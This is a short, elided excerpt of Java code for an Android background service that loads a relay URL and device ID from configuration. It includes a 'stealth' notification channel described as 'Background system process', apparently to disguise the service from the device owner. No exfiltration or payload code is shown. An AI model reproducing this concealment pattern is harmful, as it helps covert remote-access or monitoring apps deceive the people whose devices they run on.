...
public class BridgeService extends Service {
    ...
    public int onStartCommand(Intent intent, int flags, int startId) {
        ...
        if (relayUrl == null || relayUrl.isEmpty()) {
            relayUrl = com.devicebridge.utils.Config.getRelayUrl(this);
        }
        if (deviceId == null || deviceId.isEmpty()) {
            deviceId = com.devicebridge.utils.Config.getDeviceId(this);
        }
    ...
    private void createStealthNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ...
            channel.setDescription("Background system process");
